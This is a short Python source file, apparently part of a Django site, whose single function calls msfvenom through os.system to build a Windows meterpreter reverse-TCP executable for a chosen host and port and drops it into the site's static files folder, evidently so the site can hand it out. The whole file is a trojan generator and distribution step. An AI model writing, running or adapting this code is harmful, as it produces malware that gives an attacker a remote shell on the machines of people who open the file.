import os


def Trojan_exe(ip="127.0.0.1",port="",name="test"):
    str1="msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o "%(ip,port)
    str2=" /windows/E/VsWorkstation/Web/Django/msfwebsite/static/files/%s"%(name)
    #static/files/test.txt
    str=str1+str2
    try:
        os.system(str)
    except:
        return 1
    return 0